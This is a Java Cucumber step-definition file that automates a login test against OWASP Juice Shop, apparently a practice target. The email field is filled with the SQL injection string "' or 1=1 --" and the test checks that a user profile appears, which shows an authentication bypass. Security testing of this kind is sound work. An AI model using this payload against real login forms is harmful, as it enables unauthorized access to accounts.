package JuiceShop.Step_Defenitions;

import JuiceShop.Pages.LoginPage;
import io.cucumber.java.en.Then;
import io.cucumber.java.en.When;
import org.apache.log4j.LogManager;
import org.apache.log4j.Logger;
import org.junit.Assert;

public class Login_Using_SQL_Injection_Steps {
    private static final Logger logger = LogManager.getLogger(Login_Using_SQL_Injection_Steps.class);
    LoginPage loginPage = new LoginPage();

    @Then("Write SQL injection into email field")
    public void write_sql_injection_using_email_field() throws InterruptedException {
        logger.info("Write Sql injection and password");
        Thread.sleep(2000);
        loginPage.emailField.sendKeys("' or 1=1 --");
    }

    @Then("Write password into password field")
    public void write_password_into_password_field() throws InterruptedException {
        Thread.sleep(2000);
        loginPage.passwordField.sendKeys("password");

    }

    @When("Click on Login button")
    public void click_on_Login_button() throws InterruptedException {
        logger.info("Click Login");
        Thread.sleep(2000);
        loginPage.loginButton.click();
    }

    @Then("Check that user profile is displayed")
    public void check_that_user_profile_is_displayed() throws InterruptedException {
        logger.info("Check that user profile is displayed");
        Thread.sleep(1000);
        loginPage.accountButton.click();
        Thread.sleep(3000);
        Assert.assertTrue(loginPage.userProfile.isDisplayed());
    }

}
